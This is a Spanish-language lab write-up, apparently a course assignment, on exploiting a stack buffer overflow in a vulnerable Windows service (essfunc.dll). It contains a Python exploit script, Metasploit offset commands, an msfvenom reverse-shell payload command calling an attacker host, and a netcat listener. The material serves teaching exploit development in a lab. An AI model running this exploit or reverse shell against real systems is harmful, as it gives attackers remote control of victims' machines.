---
title: Trabajo Buffer Overflow
date: 2024-11-04 00:21:00 -05:00
categories: [web, Overflow]
tags: [buffer, overflow]  # tag names should always be lowercase
---



# Requerimientos del Trabajo Buffer Overflow


## Información del Entorno

- **Sistema objetivo (Windows 11)**:
  - IP: `192.168.1.12`
  - Sistema: Windows 11 con un servicio vulnerable

- **Sistema atacante (Kali Linux)**:
  - VM en el mismo entorno de red
  - Escucha conexiones TCP en el puerto `4444`

## Requerimientos de la Tarea

### Objetivo 1: Verificar Direcciones `JMP ESP` para Explotar el Buffer Overflow

Identificar y verificar, si alguna de las direcciones `JMP ESP` en el módulo vulnerable del sistema Windows 11 permite redirigir el flujo de ejecución hacia el shellcode. Esto permitirá ejecutar el exploit y obtener una conexión remota.

#### Paso 1.1: Identificar Direcciones `JMP ESP`

Se usara **Mona** en **Immunity Debugger** para buscar la instrucción `JMP ESP` en el módulo vulnerable del Windows 11, que en este caso es `essfunc.dll`. Estas direcciones nos permitirán redirigir la ejecución hacia la dirección de memoria donde se encuentra nuestro shellcode.

Ejecutamos el siguiente comando en Immunity Debugger en Windows:

```plaintext
!mona find -s "\xff\xe4" -m essfunc.dll
```

La salida de este comando nos da una lista de direcciones `JMP ESP` en `essfunc.dll`. Se tomara nota de estas direcciones para probarlas en el exploit.

#### Paso 1.2: Calcular el Offset para Sobrescribir el EIP

Para sobrescribir el **EIP** y redirigir el flujo de ejecución correctamente, debemos calcular el desplazamiento (offset) exacto en el buffer. Para hacerlo, usaremos herramientas de Metasploit desde Kali Linux.

1. **Generamos un patrón de prueba** de 400 bytes:
   ```bash
   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
   ```
2. Ejecutamos este patrón en el programa vulnerable en la laptop Windows 11 para provocar un crash.
3. Cuando el programa se detenga, verificamos el valor que sobrescribió el EIP y calculamos el offset:
   ```bash
   /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <VALOR_EIP>
   ```
   
Este valor será el tamaño necesario para llegar a sobrescribir el EIP y así redirigir la ejecución al shellcode.


#### Paso 1.3: Crear el Payload para el Exploit

Con el offset y la dirección `JMP ESP` confirmada, podemos construir el exploit en Python. Este exploit inyectará un payload que contiene un shellcode para obtener una conexión TCP inversa desde la laptop Windows hacia Kali Linux.


```python
import socket
import struct

# Configuración de conexión
ip = "192.168.1.12"  # IP del sistema Windows 11
port = 9999          # Cambia este puerto al puerto donde el servicio vulnerable está escuchando

# Configuración del payload
offset = <OFFSET_CALCULADO>  # Reemplaza con el valor obtenido en el cálculo del offset
buffer = b"A" * offset
jmp_esp = struct.pack("<I", 0x625011af)  # Dirección de JMP ESP en el módulo essfunc.dll
nop_sled = b"\x90" * 16  # NOP sled para estabilizar el shellcode

# Generación del shellcode con msfvenom (en Kali Linux):
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f python -b "\x00"
shellcode = (
    b"\xdb\xc4\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x52\x31\x50\x17\x03\x50\x17"
    # Este es solo un ejemplo de shellcode; reemplaza por el generado
)

# Estructura del payload
payload = buffer + jmp_esp + nop_sled + shellcode

# Enviar el payload al servicio vulnerable en la máquina Windows 11
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip, port))
    s.send(payload)
```

Este código envía un buffer que sobrescribe el EIP con la dirección `JMP ESP`, redirigiendo la ejecución hacia nuestro shellcode, que establece una conexión TCP inversa con Kali Linux.





### Objetivo 2: Explicar el Funcionamiento de la Conexión TCP Reversa

Una **conexión TCP reversa** es una técnica en la que el sistema comprometido (Windows 11) inicia una conexión hacia el atacante (Kali Linux). Esto es útil en muchos casos porque los firewalls permiten conexiones salientes, lo cual facilita el control de la máquina víctima.

#### Setup de Laboratorio para Conexión TCP Reversa

Para esta práctica, configuramos una VM **Kali Linux** que actuará como el atacante y una laptop **Windows 11** que será la víctima. La máquina Kali Linux escuchará en el puerto `4444` y esperará una conexión que será iniciada desde la máquina Windows cuando se ejecute el shellcode.

**Diagrama de Conexión**:

```plaintext
+-------------------+                   +-------------------+
|     Kali Linux    | <----TCP----->    |     Windows 11    |
| (Listener activo) |                   |  (Vulnerable)     |
+-------------------+                   +-------------------+
```

Para escuchar la conexión en **Kali Linux** usamos **Netcat**:

```bash
nc -lvnp 4444  # Escuchar en el puerto 4444
```

Cuando el exploit se ejecute en la máquina Windows, esta se conectará a Kali Linux en el puerto 4444, proporcionando una shell remota al atacante.




### Objetivo 3: Verificación de los Permisos en la Shell Obtenida

Una vez obtenida la conexión TCP inversa y acceso a la shell, necesitamos verificar los permisos del usuario en la máquina Windows 11. Esto nos permitirá saber si tenemos acceso administrativo o acceso restringido.

#### Paso 3.1: Comprobar Privilegios del Usuario en la Máquina Víctima

Dentro de la shell remota en Windows 11, ejecutamos los siguientes comandos para obtener información sobre el usuario y los permisos:

1. **Verificar el usuario activo**:
   ```cmd
   whoami
   ```
   Este comando nos muestra el nombre del usuario activo en la máquina comprometida.

2. **Listar los grupos y permisos del usuario**:
   ```cmd
   net user
   ```
   Esto permite verificar si tenemos privilegios elevados (de administrador) o si necesitamos realizar una **escalada de privilegios**.

Con estos comandos, podemos confirmar si tenemos acceso de administrador o si será necesario aplicar técnicas adicionales para escalar privilegios.



## Conclusión

- Este procedimiento ha cubierto todos los pasos necesarios para explotar una vulnerabilidad de buffer overflow en una máquina Windows 11 y obtener una conexión TCP inversa desde Kali Linux.

- Estos pasos incluyen la identificación de direcciones `JMP ESP`, el cálculo del offset, la construcción de un payload con un shellcode de conexión reversa y la verificación de permisos en la shell obtenida.


